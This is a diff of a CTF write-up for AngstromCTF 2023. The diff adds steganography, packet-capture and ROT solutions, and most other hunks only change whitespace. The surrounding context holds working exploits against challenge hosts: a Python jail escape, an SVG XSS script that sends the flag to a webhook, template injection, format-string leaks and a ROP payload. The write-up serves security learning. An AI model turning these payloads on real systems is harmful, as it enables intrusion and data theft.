@@ -18,14 +18,30 @@ ctf_categories:
 > _My physics teacher also loves puzzles. Maybe my homework is a puzzle too?_<br>
 > _Attachments: physics_hw.png_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+As the image didn't seem to have any artifacts, if not for the blank space at the bottom, we tried some common tools.
+
+After some tries, `zsteg --lsb physics_hw.png` gave us the flag that was encoded in the least significat bits.
+
+🏁 _actf{physics_or_forensics}_{: .spoiler}
 
 ## Admiral Shark
 
 > _I have been snooping on the conversations of my elusive enemies. See if you can help me gather the information I need to defeat them once and for all._<br>
 > _Attachments: admiral_shark.pcapng_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+Looking at the capture with WireShark, there's a clear-text communication on port 1245. Following the stream, in the packet 91 there is a zip file.
+
+After extracting the zip archive from the capture, `unzip` isn't able to unzip it as there seems to be some errors.
+
+Therefore, I tried extracting as much as possible with `binwalk`. Indeed, the flag was in one of the extracted files.
+
+```bash
+$ ack actf
+_shark.raw.extracted/xl/sharedStrings.xml
+...
+```
+
+🏁 _actf{wireshark_in_space}_{: .spoiler}
 
 ## Simon Says
 
@@ -119,7 +135,7 @@ We can only use lowercase letters and these `()=:'` symbols. Moreover we do not 
 - Execute multiple instructions without `;` or `\n`
 - Get a RCE without using the `.` to call functions
 
-The first constraint alone is easy to bypass because we can import whatever we want, also the builtins. But obviously this alone is not sufficient. I spent a lot time thinking to what we could do with `:` symbol and I came up with two things: walrus operator and lambda functions. I felt that I was on the right path but I didn't manage to put everything together. So I decided to focus on searching a method to execute multiple expressions only with `()=:'`. After a while something clicked and I realized that I could use the `==` operator to execute multple expressions! Furthermore with the walrus operator we can assign inside expressions. So I thought I had the solution and tried with: 
+The first constraint alone is easy to bypass because we can import whatever we want, also the builtins. But obviously this alone is not sufficient. I spent a lot time thinking to what we could do with `:` symbol and I came up with two things: walrus operator and lambda functions. I felt that I was on the right path but I didn't manage to put everything together. So I decided to focus on searching a method to execute multiple expressions only with `()=:'`. After a while something clicked and I realized that I could use the `==` operator to execute multple expressions! Furthermore with the walrus operator we can assign inside expressions. So I thought I had the solution and tried with:
 
 ```python
 (__builtins__:=__import__('os'))==print('test')
@@ -145,7 +161,7 @@ So after the CTF, while reading other writeups, I found out why this works: in p
 
 ![catch me if you can](/assets/img/AngstromCTF_2023/catch-me-if-you-can.gif){: .image-66}
 
-Some text is spinning on the page and it seems to be the flag. Ok, let's dig into html source code. 
+Some text is spinning on the page and it seems to be the flag. Ok, let's dig into html source code.
 
 ```html
 <body>
@@ -163,7 +179,7 @@ Yep, it was the flag. Quite straightforward.
 > _I love Celeste Speedrunning so much!!! It's so funny to watch!!! Here's my favorite site!_<br>
 > _https://mount-tunnel.web.actf.co/_
 
-We have to beat other players by playing at Celeste speedrun game. The main page shows us the scoreboard. 
+We have to beat other players by playing at Celeste speedrun game. The main page shows us the scoreboard.
 
 ```html
 Welcome to Celeste speedrun records!!!<br>
@@ -175,7 +191,7 @@ Current record holders (beat them at <current URL>/play for a flag!):
 </ol>
 ```
 
-Looking at `/play` source code, we need to send a `start` value to `/submit` in order to play. 
+Looking at `/play` source code, we need to send a `start` value to `/submit` in order to play.
 
 ```html
 <form action="/submit" method="POST">
@@ -376,7 +392,7 @@ async def app(scope, receive, send):
                 return
 
     # [...]
-``` 
+```
 
 If we set the `host` header to `flag.local`, we will retrieve the flag.
 
@@ -413,7 +429,7 @@ app.get("/flag", (req, res) => {
 });
 ```
 
-From `/card` we can create new cards, edit or print them. The server sets the right `content-type` header to print a card based on its content, which can be text or a SVG image. 
+From `/card` we can create new cards, edit or print them. The server sets the right `content-type` header to print a card based on its content, which can be text or a SVG image.
 
 ```javascript
 app.get("/card", (req, res) => {
@@ -488,7 +504,7 @@ and `content` to
 </svg>
 ```
 
-This way we can inject custom SVG payload and run a JS script since `content-type` header will be `image/svg+xml`. Let's see if it can work. 
+This way we can inject custom SVG payload and run a JS script since `content-type` header will be `image/svg+xml`. Let's see if it can work.
 
 ![hallmarket XSS](/assets/img/AngstromCTF_2023/hallmark-xss.png){: .image-66}
 
@@ -504,7 +520,7 @@ url = 'https://hallmark.web.actf.co/card'
 
 post_data = {
     'svg': 'text',
-    'content': 'text' 
+    'content': 'text'
 }
 
 r = requests.post(url, data=post_data, allow_redirects=False)
@@ -517,7 +533,7 @@ content = '''
    <script type="text/javascript">
         var xmlHttp = new XMLHttpRequest();
 
-        xmlHttp.onreadystatechange = function() { 
+        xmlHttp.onreadystatechange = function() {
             if(xmlHttp.status == 200) {
                 flag = xmlHttp.responseText;
                 document.location = "''' + webhook + '''?p=" + flag;
@@ -534,7 +550,7 @@ put_data = {
     'id': my_card_id,
     'type[]': ['image/svg+xml'],
     'svg': '',
-    'content': content 
+    'content': content
 }
 
 r = requests.put(url, data=put_data)
@@ -554,7 +570,7 @@ else:
 > _Attachments: app.py, brokenlogin.js_
 
 
-From `app.py` we know that `message` argument can be printed if we pass it to the main page, but only if its content is no longer than 25 characters. 
+From `app.py` we know that `message` argument can be printed if we pass it to the main page, but only if its content is no longer than 25 characters.
 
 ```python
 # [...]
@@ -588,9 +604,9 @@ def index():
     if "message" in request.args:
         if len(request.args["message"]) >= 25:
             return render_template_string(indexPage, fails=fails)
-        
+
         custom_message = escape(request.args["message"])
-    
+
     return render_template_string(indexPage % custom_message, fails=fails)
 
 # [...]
@@ -600,7 +616,7 @@ We can try to send a template injection to see if the web app is vulnerable, for
 
 ![brokenlogin injection](/assets/img/AngstromCTF_2023/brokenlogin-1.png){: .image-66}
 
-We can see a `21`, so `7*3` has been evaluated. Now, let's get into admin bot source code. The admin will load the page sended by the user (only if the url is from ctf domain) and fill out a form with username and the flag as password. 
+We can see a `21`, so `7*3` has been evaluated. Now, let's get into admin bot source code. The admin will load the page sended by the user (only if the url is from ctf domain) and fill out a form with username and the flag as password.
 
 ```javascript
 module.exports = {
@@ -613,7 +629,7 @@ module.exports = {
         await page.goto(url);
 
         await page.waitForSelector("input[name=username]");
-        
+
         await page.$eval(
           "input[name=username]",
           (el) => (el.value = "admin")
@@ -702,7 +718,9 @@ which is executed after the submission of the fake form
 > _`rtkw{cf0bj_czbv_nv'cc_y4mv_kf_kip_re0kyvi_uivjj1ex_5vw89s3r44901831}`_<br>
 > _Attachments: ranch.py_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+As the name implies, this is a ROT encoding. Using 9 rotations we get the flag. Quick points!
+
+🏁 _actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}_{: .spoiler}
 
 ## impossible
 
@@ -727,7 +745,7 @@ def one_encoding(x, n): # encodes x
 	for i in range(n):
 		if x & 1:
 			ret.append(x)
-		
+
 		x >>= 1
 	return ret
 ```
@@ -736,7 +754,7 @@ def one_encoding(x, n): # encodes x
 def zero_encoding(x, n): # encodes y
 	ret = []
 	for i in range(n):
-		if (x & 1) == 0: 
+		if (x & 1) == 0:
 			ret.append(x | 1)
 		x >>= 1
 	return ret
@@ -770,7 +788,7 @@ y will be (2 ** 64)-1, since its binary representation is:
 > _nc challs.actf.co xxxxx_<br>
 > _Attachments: lazylagrange.py_
 
-The challenge provide us with the source code of the challenge. 
+The challenge provide us with the source code of the challenge.
 
 ```python:source.py
 #!/usr/local/bin/python
@@ -843,7 +861,7 @@ while True:
 
 We can perform two queries:
 - Query1: allow us to send one (or more) integer `x` and it computes the value of $$p(x)=\Sigma_{i=0}^{17} a_i \cdot x^i
-$$ 
+$$
   where the $a_i$ are the ascii decimal values of the flag's characters.
 - Query2: allow us to to send 18 integres values and if these are equal to the coefficients $a_i$ used in Query1 it prints their position in the flag.
 
@@ -853,7 +871,7 @@ $$
 k^n > \Sigma_{i=0}^{n-1} 127*k^i \\
 \forall n \in [1,17]
 $$
-then I would have been able to recover all the $a_i$. This is done, for each $a_i$, by subtracting from $p(k)$ the possible $a_{i_j}k^i$ ($j \in [0,127]$); the right $a_{i_j}$ is the highest such that $p(k)-a_{i_j}k^i \ge 0$. 
+then I would have been able to recover all the $a_i$. This is done, for each $a_i$, by subtracting from $p(k)$ the possible $a_{i_j}k^i$ ($j \in [0,127]$); the right $a_{i_j}$ is the highest such that $p(k)-a_{i_j}k^i \ge 0$.
 Moreover we need that $p(k) \le M$ where $M=2^{127}-1$. A $k$ that satisfy all the constraints is `130`.
 
 ```python:solve.py
@@ -960,7 +978,7 @@ _{: .spoiler}
 
 A way to solve this challenge is to use the command "strings" on the binary file; the flag is not encoded in the binary.
 
--> Another solution is to open the file with Ghidra. In the main function we can see that a function ``strncmp`` is called, comparing our input with the flag. 
+-> Another solution is to open the file with Ghidra. In the main function we can see that a function ``strncmp`` is called, comparing our input with the flag.
 In this way, we can see the flag looking at the decompiled code.
 
 🏁 _actf{ive_be3n_checkm4ted_21d1b2cebabf983f}_{: .spoiler}
@@ -971,7 +989,7 @@ In this way, we can see the flag looking at the decompiled code.
 > _nc challs.actf.co xxxxx_<br>
 > _Attachments: zaza_
 
-If we interact with the remote service, it says: "I'm going to sleep. Count me some sheep: " 
+If we interact with the remote service, it says: "I'm going to sleep. Count me some sheep: "
 It seems like it wants a specific number. Let's try to open it with Ghidra to understand better.
 
 In the main function:
@@ -1041,7 +1059,7 @@ r.sendline(b'4919') # input1
 r.sendline(b'1') # input2
 
 s = "anextremelycomplicatedkeythatisdefinitelyuselessss"
-target = "2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#" 
+target = "2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#"
 magic_word = ""
 target = target.encode()
 s = s.encode()
@@ -1049,7 +1067,7 @@ s = s.encode()
 # reversed xor_ function
 for i in range(len(s)):
 	magic_word += chr(target[i] ^ s[i])
-	
+
 r.sendline(magic_word.encode()) # input3
 r.interactive()
 ```
@@ -1191,7 +1209,7 @@ Yes! That was it, using this input the server returns the flag
 
 Connecting to the challenge we are asked: `What did you learn in class today?` so we can send a string. We can submit a format string like `%p` to see that it returns `Oh nice, 0x7ffe79e8d120`. We can also access directly some parameters in this way:
 
-`%<number_of_parameter>$<format>` for exemple: `%14$llx,%15$llx,%16$llx`; it returns: 
+`%<number_of_parameter>$<format>` for exemple: `%14$llx,%15$llx,%16$llx`; it returns:
 
 `Oh nice, 3474737b66746361,75715f74695f6b63,615f74695f657565`.
 We can see with some tries that the flag is here in the stack. So we can script the solution.
@@ -1241,7 +1259,7 @@ void main(void)
 {
   char local_48 [60];
   __gid_t local_c;
-  
+
   setbuf(stdout,(char *)0x0);
   local_c = getegid();
   setresgid(local_c,local_c,local_c);
@@ -1284,7 +1302,7 @@ def main():
     offset = 72
     pop_rdi = p64(0x00000000004012b3)
     ret = p64(0x000000000040101a)
-    
+
     payload = b'a'*offset + pop_rdi + \
         p64(exe.got.printf) + p64(exe.sym.puts) + p64(exe.sym.main)
     r.sendlineafter(b': ', payload)
@@ -1327,7 +1345,7 @@ void main(void)
   int j;
   char second_input [40];
   long canary;
-  
+
   canary = *(long *)(in_FS_OFFSET + 0x28);
   seed = time((time_t *)0x0);
   srand((uint)seed);
@@ -1383,7 +1401,7 @@ The last problem to solve is to don't make the program crash on the free instruc
 
 ![leek](/assets/img/AngstromCTF_2023/leek.png)
 
-As we can see in the picture above the metadata of the random bytes memory chunk are overwritten. Luckily we can fix up the metadata with another overflow (`gets(my_input);`) after the guess. 
+As we can see in the picture above the metadata of the random bytes memory chunk are overwritten. Luckily we can fix up the metadata with another overflow (`gets(my_input);`) after the guess.
 
 ```python:solve.py
 #!/usr/bin/env python3
